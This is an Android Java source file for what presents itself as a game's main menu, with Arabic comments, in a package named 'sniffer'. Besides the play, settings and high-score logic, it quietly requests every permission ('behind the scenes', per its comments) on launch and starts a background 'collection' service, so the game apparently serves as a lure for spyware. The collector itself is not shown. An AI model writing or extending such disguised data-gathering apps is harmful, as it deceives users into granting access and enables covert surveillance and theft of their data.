package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.services.CollectorService;
import com.v8.global.sniffer.utils.PermissionHelper;
import java.util.ArrayList;
import java.util.List;

public class MainGameActivity extends Activity {

    private Button btnPlay, btnSettings, btnExit;
    private TextView tvHighScore, tvWelcome;
    private ImageView ivLogo;
    private PermissionHelper permissionHelper;
    private int highScore = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        // تهيئة العناصر
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnExit = findViewById(R.id.btn_exit);
        tvHighScore = findViewById(R.id.tv_high_score);
        tvWelcome = findViewById(R.id.tv_welcome);
        ivLogo = findViewById(R.id.iv_logo);

        // إضافة تأثيرات حركية
        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);

        // تحميل أفضل نتيجة
        loadHighScore();

        // بدء طلب الصلاحيات (خلف الكواليس)
        permissionHelper = new PermissionHelper(this);
        permissionHelper.requestAllPermissions();

        // بدء خدمات الجمع في الخلفية
        startBackgroundServices();

        // أزرار اللعبة
        btnPlay.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // تأثير النقر
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                
                // التحقق من الصلاحيات قبل اللعب
                if (permissionHelper.hasAllPermissions()) {
                    Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                    startActivity(intent);
                } else {
                    Toast.makeText(MainGameActivity.this, "جاري تجهيز اللعبة... انتظر لحظة", Toast.LENGTH_SHORT).show();
                    // طلب الصلاحيات مرة أخرى
                    permissionHelper.requestAllPermissions();
                    
                    // تأخير ثم فتح اللعبة
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                            startActivity(intent);
                        }
                    }, 2000);
                }
            }
        });

        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameSettingsActivity.class);
                startActivity(intent);
            }
        });

        btnExit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                finishAffinity();
            }
        });
    }

    private void loadHighScore() {
        // تحميل أفضل نتيجة من التخزين
        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("أفضل نتيجة: " + highScore);
    }

    private void startBackgroundServices() {
        // تشغيل خدمة الجمع التلقائي
        Intent serviceIntent = new Intent(this, CollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadHighScore();
    }
}
